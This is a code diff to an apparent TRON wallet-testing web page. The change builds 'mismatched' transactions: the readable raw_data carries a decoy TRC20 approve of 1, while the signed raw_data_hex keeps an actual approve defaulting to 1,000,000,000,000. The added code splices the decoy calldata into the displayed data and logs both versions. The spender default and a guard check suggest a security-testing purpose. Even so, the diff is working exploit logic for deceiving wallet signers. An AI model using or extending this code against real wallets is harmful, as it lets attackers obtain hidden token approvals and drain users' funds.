@@ -182,7 +182,8 @@
             <label id="decoyTrxLabel" style="display:none">Decoy TRX <input id="decoyTrx" inputmode="decimal" value="0.01" /></label>
             <label>TRC20 contract <input id="tokenContract" autocomplete="off" placeholder="token contract address" /></label>
             <label>Approve spender <input id="spender" autocomplete="off" placeholder="defaults to current account" /></label>
-            <label>Approve amount <input id="approveAmount" inputmode="numeric" value="1" /></label>
+            <label>Decoy amount <input id="decoyApproveAmount" inputmode="numeric" value="1" /></label>
+            <label>Actual amount <input id="approveAmount" inputmode="numeric" value="1000000000000" /></label>
             <label>Fee limit <input id="feeLimit" inputmode="numeric" value="100000000" /></label>
           </div>
 
@@ -457,6 +458,7 @@
         const tokenContract = requireAddress("tokenContract", "", "TRC20 contract");
         const spender = toBase58(requireAddress("spender", owner, "Approve spender"));
         const approveAmount = integerText("approveAmount", "Approve amount");
+        const decoyApproveAmount = integerText("decoyApproveAmount", "Decoy amount");
         const feeLimit = Number(integerText("feeLimit", "Fee limit"));
         validateGuards(spender);
 
@@ -471,7 +473,7 @@
             tokenContract,
             "approve(address,uint256)",
             { feeLimit, callValue: 0 },
-            [{ type: "address", value: spender }, { type: "uint256", value: 0 }],
+            [{ type: "address", value: spender }, { type: "uint256", value: decoyApproveAmount }],
             owner
           );
           decoyTx = decoyResult.transaction || decoyResult;
@@ -490,7 +492,13 @@
         if (!actualTx?.raw_data_hex || !actualTx?.raw_data) throw new Error("triggerSmartContract did not return raw_data/raw_data_hex.");
 
         const mismatchedTx = clone(actualTx);
-        mismatchedTx.raw_data = clone(decoyTx.raw_data);
+        if (decoyType === "transferTrx") {
+          mismatchedTx.raw_data = clone(decoyTx.raw_data);
+        } else {
+          const decoyData = decoyTx.raw_data?.contract?.[0]?.parameter?.value?.data;
+          if (!decoyData) throw new Error("Decoy transaction missing calldata.");
+          mismatchedTx.raw_data.contract[0].parameter.value.data = decoyData;
+        }
         mismatchedTx.raw_data_hex = actualTx.raw_data_hex;
         mismatchedTx.txID = actualTx.txID;
         if ("visible" in actualTx) mismatchedTx.visible = actualTx.visible;
@@ -504,8 +512,10 @@
         log("Mismatched transaction built", {
           txID: mismatchedTx.txID,
           decoyType,
-          rawDataType: decoyTx.raw_data?.contract?.[0]?.type,
+          rawDataType: mismatchedTx.raw_data?.contract?.[0]?.type,
           rawDataHexType: actualTx.raw_data?.contract?.[0]?.type,
+          decoyCalldata: mismatchedTx.raw_data?.contract?.[0]?.parameter?.value?.data?.slice(0, 16) + "...",
+          actualCalldata: actualTx.raw_data?.contract?.[0]?.parameter?.value?.data?.slice(0, 16) + "...",
           triggerResult: triggerResult.result
         });
         render();
